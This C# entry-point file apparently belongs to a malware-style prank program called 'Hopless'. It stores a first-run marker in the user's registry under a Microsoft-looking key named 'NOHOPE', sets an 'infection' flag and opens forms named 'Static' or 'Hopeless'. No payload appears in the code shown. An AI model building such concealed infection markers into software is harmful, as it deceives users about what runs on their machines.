using System;
using System.Collections.Generic;
using System.Linq;
using System.Security.Cryptography.X509Certificates;
using System.Text;
using System.Threading.Tasks;
using System.Windows.Forms;
using Microsoft.Win32;

namespace Hopless
{
    internal class Program
    {
        [STAThread]
        static void Main(string[] args)
        {
            
            Application.EnableVisualStyles();
            Application.SetCompatibleTextRenderingDefault(false);
           
            using (var key = Registry.CurrentUser.CreateSubKey(@"Software\Microsoft\NOHOPE"))
            {
                key.GetValue("goodbye");
                if (key.GetValue("goodbye") == null)
                {
                    
                    var rkey = Registry.CurrentUser.CreateSubKey(@"Software\Microsoft\NOHOPE");
                    rkey.SetValue("goodbye", "HAHAHAHAHAHAHAHAHA");

                    rkey.Flush();
                    Application.Run(new Static());
                         
                       
                         

                }
                else
                {
                    Application.Run(new Hopeless());
                }
            }
            
           

        }
        public static bool infection = false;
    }
}
